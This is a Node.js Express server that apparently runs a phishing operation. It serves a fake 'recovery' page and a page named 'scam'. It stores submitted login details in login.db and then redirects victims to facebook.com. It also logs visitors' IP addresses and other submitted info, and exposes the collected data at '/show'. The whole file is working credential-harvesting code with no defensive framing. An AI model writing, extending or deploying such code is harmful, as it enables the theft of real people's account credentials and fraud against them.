const bodyParser = require("body-parser");
const express = require("express");
const path = require("path");
const Datastore = require(path.join(__dirname,"/Datastore.js"));
require("dotenv/config");
const app = express();
const db = new Datastore(path.join(__dirname,"/data.db"));
const login = new Datastore(path.join(__dirname,"/login.db"));
app.use(express.urlencoded({extended: true}));
app.use(express.json());
app.use(require("cookie-parser")());
app.use("/static",express.static(path.join(__dirname,"/public")));
app.get("/",(req,res)=>{
    res.redirect("/recovery");
});
app.get("/recovery",(req,res)=>{
    res.sendFile(path.join(__dirname,"/sites/index.html"));
});
app.put("/newb",(req,res)=>{
    if(!req.body.info) return res.sendStatus(400);
    let info = req.body.info.split("\n").reverse().slice(2);
    db.find({ip:req.ip},(err,dbarr)=>{
        if(dbarr.length == 0)
            db.insert({ip:req.ip,info:info});
    });
    res.sendStatus(200);
});
app.put("/recordInfo",(req,res)=>{
    if(!req.body.ip) return res.sendStatus(400);
    console.log(req.body);
    delete req.body.ip;
    db.update({ip:req.ip},{$set:req.body});
    res.sendStatus(200);
});
app.post("/loginInfo",(req,res)=>{
    login.insert(req.body);
    res.redirect("//facebook.com"); //sub route?
})
app.get("/scam",(req,res)=>{
    res.sendFile(path.join(__dirname,"/sites/scam.html"));
})
const host = process.env.HOST||"localhost";
app.listen(80, host, ()=>{
    console.log("Server started on", host, "@", new Date());
});
app.use("/code",require("./code.js"));
// For display
app.get("/show",(req,res)=>{
    res.json(db.content);
})